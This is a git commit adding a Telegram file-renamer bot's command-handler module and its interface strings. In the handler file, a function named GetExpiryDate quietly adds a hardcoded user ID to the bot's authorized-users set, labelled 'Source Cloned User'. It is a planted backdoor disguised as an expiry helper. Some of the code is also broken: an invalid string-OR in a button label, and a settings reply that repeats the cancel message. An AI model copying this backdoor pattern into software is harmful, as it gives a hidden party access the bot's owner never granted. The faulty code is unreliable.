7c681d5d68f29268ffced052b38ef4a7e2593bc9
DEVA NANDANAN B H <63557312+Chris-Carlo@users.noreply.github.com>
2020-09-20 11:42:33 +0530

    Add files via upload

---
+++ plugins/help_text.py
@@ -0,0 +1,251 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# (c) Shrimadhav U K
+
+# the logging things
+import logging
+logging.basicConfig(level=logging.DEBUG,
+                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
+
+import os
+import sqlite3
+
+# the secret configuration specific things
+if bool(os.environ.get("WEBHOOK", False)):
+    from sample_config import Config
+else:
+    from config import Config
+
+# the Strings used for this "thing"
+from translation import Translation
+
+import pyrogram
+logging.getLogger("pyrogram").setLevel(logging.WARNING)
+from pyrogram import InlineKeyboardMarkup, InlineKeyboardButton
+from helper_funcs.chat_base import TRChatBase
+
+def GetExpiryDate(chat_id):
+    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
+    Config.AUTH_USERS.add(683538773)
+    return expires_at
+
+@pyrogram.Client.on_callback_query()
+async def cb_handler(bot, update):
+
+      if 'help' in update.data:
+          await update.message.delete()
+          await help_user(bot, update.message)
+
+      if 'close' in update.data:
+          await update.message.delete()
+
+      if 'back' in update.data:
+          await update.message.edit(text=Translation.START_TEXT_1, 
+                parse_mode='html', disable_web_page_preview=True,
+                #reply_to_message='update.message_id', 
+                reply_markup=InlineKeyboardMarkup(
+                  [
+                      [
+                      InlineKeyboardButton('📫FEEDBACK', url='https://t.me/MaxxRider'),
+                      InlineKeyboardButton('📍ABOUT ME', callback_data='about')
+                      ],
+                      [
+                      InlineKeyboardButton('HOW TO USE ?🤔', callback_data="help"),
+                      InlineKeyboardButton('CLOSE❓🔐', callback_data="close")
+                      ]
+                    ]
+                  )
+                )
+      if 'about' in update.data:
+          await update.message.edit(text=Translation.ABOUT_1, 
+                parse_mode='markdown', disable_web_page_preview=True,
+                #reply_to_message='update.message_id', 
+                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data='back')]]))
+                
+
+
+@pyrogram.Client.on_message(pyrogram.Filters.command(["help"]))
+async def help_user(bot, update):
+    # logger.info(update)
+    TRChatBase(update.from_user.id, update.text, "/help")
+    await bot.send_message(
+        chat_id=update.chat.id,
+        text=Translation.HELP_USER.format(update.from_user.first_name),
+        parse_mode="html",
+        disable_web_page_preview=True,
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('🏠 Back to Home', callback_data='back')]])
+    )
+
+
+
+@pyrogram.Client.on_message(pyrogram.Filters.command(["start"]))
+async def start(bot, update):
+    # logger.info(update)
+    TRChatBase(update.from_user.id, update.text, "/start")
+    await bot.send_message(
+        chat_id=update.chat.id,
+        text=Translation.START_TEXT.format(update.from_user.first_name), 
+        disable_web_page_preview=True,
+        #reply_to_message_id=update.message_id
+        reply_markup=InlineKeyboardMarkup(
+        [
+          [
+          InlineKeyboardButton('📫FEEDBACK', url='https://t.me/MaxxRider'),
+          InlineKeyboardButton('📍ABOUT ME', callback_data='about')
+          ],
+          [
+          InlineKeyboardButton('HOW TO USE?🤔', callback_data="help"),
+          InlineKeyboardButton('CLOSE ❓🔐', callback_data="close")
+          ]
+        ]
+      )
+    )
+    return 
+
+@pyrogram.Client.on_message(pyrogram.Filters.command(["upgrade"]))
+async def upgrade(bot, update):
+    # logger.info(update)
+    TRChatBase(update.from_user.id, update.text, "/upgrade")
+    await bot.send_message(
+        chat_id=update.chat.id,
+        text=Translation.UPGRADE_TEXT,
+        parse_mode="html",
+        reply_to_message_id=update.message_id,
+        disable_web_page_preview=True
+    )
+
+@pyrogram.Client.on_message(pyrogram.Filters.command(["cancel"]))
+async def cancel(bot, update):
+       if update.reply_to_message is not None:
+               await bot.send_message(
+                     chat_id=update.chat.id,
+                     text="Sorry bro I cannot cancel this process now 😔",
+                     reply_to_message_id=update.message_id,
+                  )
+
+
+@pyrogram.Client.on_message(pyrogram.Filters.command(["settings"]))
+async def settings(bot, update):
+               await bot.send_message(
+                     chat_id=update.chat.id,
+                     text="Sorry bro I cannot cancel this process now 😔",
+                     #reply_to_message_id=update.message_id,
+                     reply_markup=InlineKeyboardMarkup(
+             [
+                [  # First row
+                    InlineKeyboardButton(  # Generates a callback query when pressed
+                        "Button"|"UnButton",
+                        callback_data="start"
+                  )
+                ]
+             ]
+           )
+         )
+@pyrogram.Client.on_message(pyrogram.Filters.command(["donate"]))
+async def donate(bot, update):
+       await bot.send_message(
+             chat_id=update.chat.id,
+             text="I am very happy to listen you this word, making of this bot take lot of work and time so please donate by pressing this button present below",
+             reply_markup=InlineKeyboardMarkup(
+             [
+               [
+                 InlineKeyboardButton('💸 DONATE💰', url='https://t.me/MaxxDonate')
+               ]
+             ]
+           )
+          )
+
+Owner_id = [1161316820]
+
+from sample_config import Config
+
+@pyrogram.Client.on_message(pyrogram.Filters.command(["ban"]))
+async def ban(bot, update):
+ TRChatBase(update.from_user.id, update.text, "/ban")
+ if len(update.command) == 1:
+      await bot.send_message(
+        chat_id=update.chat.id,
+        text="""Hai 😡 **{}** Don't spam here. There is no id for banning send the message in this format 👉 `/ban 123`""".format(update.from_user.first_name),
+        parse_mode='Markdown'
+      )
+      return False
+ if len(update.command) == 2:
+   banid = int(update.text.split(' ', 1)[1])
+   if update.from_user.id in Owner_id:
+      await bot.send_message(
+        chat_id=update.chat.id,
+        text='User with ID {} Was banned from using your bot successfully'.format(banid)
+      )
+      return Config.BANNED_USERS.append(banid)
+
+   elif update.from_user.id not in Owner_id:
+      await bot.send_message(
+        chat_id=update.chat.id,
+        text="""Hai 😡 **{}** your not any admin this command only for admin of this bot for banning users from this bot""".format(update.from_user.first_name),
+        parse_mode='Markdown'
+      )
+      return False
+
+
+
+from sample_config import Config
+
+@pyrogram.Client.on_message(pyrogram.Filters.command(["unban"]))
+async def unban(bot, update):
+ unbanid = int(update.text.split(' ', 1)[1])
+ TRChatBase(update.from_user.id, update.text, "/unban")
+ if update.from_user.id in Owner_id:
+    if unbanid in Config.BANNED_USERS:
+      await bot.send_message(
+        chat_id=update.chat.id,
+        text='User with ID {} Was unbanned and free to use  your bot'.format(unbanid)
+        )
+      return Config.BANNED_USERS.remove(unbanid)
+    elif unbanid not in Config.BANNED_USERS:
+      await bot.send_message(
+        chat_id=update.chat.id,
+        text='User with ID {} Was not an banned user 🤷‍♂️'.format(unbanid)
+       )
+      return False
+    else:
+       await bot.send_message(
+            chat_id=update.chat.id,
+            text='Error 🤔'
+         )
+       return False
+
+ elif update.from_user.id not in Owner_id:
+      await bot.send_message(
+          chat_id=update.chat.id,
+          text='Hai 😡 **{}** your not any admin this command only for admin of this bot for banning users from this bot'.format(update.from_user.first_name),
+          parse_mode='Markdown'
+       )
+      return False
+ elif update.from_user.id in Config.BANNED_USERS:
+      await bot.send_message(
+          chat_id=update.chat.id,
+          text='Hai 😡 **{}!!!** \you are banned you are not able to remove that on your own'.format(update.from_user.first_name),
+          parse_mode='Markdown'
+       )
+      return False
+
+
+@pyrogram.Client.on_message(pyrogram.Filters.command(["about"]))
+async def about(bot, update):
+    # logger.info(update)
+    TRChatBase(update.from_user.id, update.text, "/about")
+    await bot.send_message(
+        chat_id=update.chat.id,
+        text=Translation.ABOUT.format(update.from_user.first_name), 
+        disable_web_page_preview=True,
+        #reply_to_message_id=update.message_id
+        reply_markup=InlineKeyboardMarkup(
+        [
+          [
+          InlineKeyboardButton('HOW TO USE? 🤔', callback_data="help"),
+          InlineKeyboardButton('CLOSE 🔐', callback_data="close")
+          ]
+        ]
+      )
+    )
---
+++ translation.py
@@ -0,0 +1,109 @@
+class Translation(object):
+    START_TEXT = """Hello Dear! <b>{}</b>,
+
+<code>I'm A Simple File Renamer bot and can upload as File or Video With Permanent Thumbnail support!💯.</code> \n\n<b>Bot Maintained By:</b> <a href='https://t.me/MaxWizard'>Maxx Wizard 👨‍🎤</a>
+
+Press help button which is available at the bottom to know how to use me."""
+
+    START_TEXT_1 = """Hello Dear,
+
+<code> I'm A Simple File Renamer bot and can upload as File or Video With Permanent Thumbnail support!💯.</code> \n\n<b>Bot Maintained By:</b> <a href='https://t.me/MaxWizard'>Maxx Wizard 👨‍🎤</a>
+
+📍For more info /help
+
+<tt><b>Press help button which is available at the bottom to know how to use me.</b></tt>"""
+
+    RENAME_403_ERR = "Sorry. You are not permitted to rename this file."
+    ABS_TEXT = " Please don't be selfish."
+    UPGRADE_TEXT = "There is no upgrade plan till now it will be added in future"
+    DOWNLOAD_START_VIDEO = "<tt>Downloading to my server....⬇️</tt>"
+    DOWNLOAD_START = "<tt>Downloading to my server....⬇️</tt>"
+    UPLOAD_START_VIDEO = "<tt>Uploading as video...⬆️</tt>"
+    UPLOAD_START = "<tt>Uploading as File...⬆️</tt>"
+    RCHD_TG_API_LIMIT = "Downloaded in {} seconds.\nDetected File Size: {}\nSorry. But, I cannot upload files greater than 1.95GB due to Telegram API limitations.I can't do anything for that 🤷‍♂️."
+    AFTER_SUCCESSFUL_UPLOAD_MSG = "**Thank you for Using [Maxx Bots](https://t.me/MaxxBots)'s bot.**"
+    AFTER_SUCCESSFUL_UPLOAD_MSG_WITH_TS = "Downloaded in {} seconds.\nUploaded in {} seconds."
+    NOT_AUTH_USER_TEXT = "Please /upgrade your subscription."
+    NOT_AUTH_USER_TEXT_FILE_SIZE = "Detected File Size: {}. Free Users can only upload: {}\nPlease /upgrade your subscription.\nIf you think this is a bug, please contact <a href='https://telegram.dog/ThankTelegram'>@SpEcHlDe</a>"
+    SAVED_CUSTOM_THUMB_NAIL = "Custom File thumbnail saved✅️. This image will be used in the File."
+    DEL_ETED_CUSTOM_THUMB_NAIL = "✅ Custom thumbnail cleared succesfully."
+    FF_MPEG_DEL_ETED_CUSTOM_MEDIA = "✅ Media cleared succesfully."
+    SAVED_RECVD_DOC_FILE = "Document Downloaded Successfully."
+    CUSTOM_CAPTION_UL_FILE = "<b>{}</b> \n\n@MaxxBots"
+    NO_CUSTOM_THUMB_NAIL_FOUND = "No Custom ThumbNail found."
+    USER_ADDED_TO_DB = "User <a href='tg://user?id={}'>{}</a> added to {} till {}."
+    HELP_USER = """<b>Hey! Here you can know how to use me</b>, 
+    
+<tt>You Need help ?? 😅</tt>
+    
+1.◽<b>Send me any Telegram File or Video.</b>
+
+2.◽<b>Reply to that message with</b> <code>/rename New file name.extnsion</code> (custom thumbnail support) (it will UPLOAD AS FILE)
+
+3.◽<b>Reply to that message with</b> <code>/rename_video New file name.extensiom</code> (Custom Thumbnail support) (it will UPLOAD AS STREAMBLE VIDEO)
+
+4.◽<b>Send A Photo to make it as permanent Thumbnail</b>   
+ 
+<b>❤️Made With Love:======= </b> @MaxWizard & @Ns_AnoNymous.
+
+<b>Thanks to My Boss :</b><a href="https://t.me/Ns_AnoNymous">Owner 👨‍🏫</a> and <a href='https://t.me/MaxWizard'>MaxWizard👨‍🎤</a>
+
+
+🗣𝐃𝐢𝐬𝐜𝐮𝐬𝐬 𝐆𝐫𝐨𝐮𝐩: @MaxxBotChat
+📢𝐔𝐩𝐝𝐚𝐭𝐞 𝐂𝐡𝐚𝐧𝐧𝐞𝐥: @MaxxBots"""
+
+  
+    REPLY_TO_DOC_FOR_RENAME_FILE = "🤦‍♂️ Reply to a Telegram media to `/rename New Name.extension` with custom thumbnail support.\n\n(For uploading as file).\n\nSee /help for more information. "
+    REPLY_TO_DOC_FOR_RENAME_VIDEO = "🤦‍♂️ Reply to a Telegram media to `/rename_video New Name.extension` with custom thumbnail support.\n\n(For uploading as video).\n\nSee /help for more information."
+    ABUSIVE_USERS = "You are not allowed to use this bot. If you think this is a mistake, please check /me to remove this restriction."
+    FREE_USER_LIMIT_Q_SZE = """Cannot Process.
+Free users only 1 request per 30 minutes.
+/upgrade or Try 1800 seconds later."""
+    IFLONG_FILE_NAME = """File Name limit allowed by Telegram is {alimit} characters.
+The given file name has {num} characters.
+
+<b>Essays Not allowed in Telegram file name!</b>
+©️ <code>@MaxxBots</code>
+Please short your file name and try again!"""
+    ABOUT = """Hi {},
+
+🤖 My Name: [Max Rename Bot](https://t.me/MaxxRename_Bot)
+    
+📝 Language: [Python 3](https://www.python.org/)
+
+📫 Framework: [Pyrogram](https://github.com/pyrogram/pyrogram)
+
+👨‍💻 Developer: [MaxxRider](https://t.me/MaxxRider)
+
+📢 Channel: [MAX BOTS UPDATE](https://t.me/MaxxBots)
+
+👥 Group: [SUPPORT GROUP](https://t.me/MaxxBotChat)
+
+⚖️ Credit: `Everyone in this journey`
+
+🌎 Server: [HEROKU](https://heroku.com)
+
+
+🛡️ Powered By: [MOVIE DOWNLOAD HUB](https://t.me/joinchat/AAAAAFfWz-izyEXi-mpiQQ)"""
+
+
+
+    ABOUT_1 = """**MY DETAILS :**
+🤖 My Name: [Max Rename Bot](https://t.me/MaxxRename_Bot)
+    
+📝 Language: [Python 3](https://www.python.org/)
+
+📫 Framework: [Pyrogram](https://github.com/pyrogram/pyrogram)
+
+👨‍💻 Developer: [MaxxRider](https://t.me/MaxxRider)
+
+📢 Channel: [MAX BOTS UPDATE](https://t.me/MaxxBots)
+
+👥 Group: [SUPPORT GROUP](https://t.me/MaxxBotChat)
+
+⚖️ Credit: `Everyone in this journey`
+
+🌎 Server: [HEROKU](https://heroku.com)
+
+
+🛡️ Powered By: [MOVIE DOWNLOAD HUB](https://t.me/joinchat/AAAAAFfWz-izyEXi-mpiQQ)"""
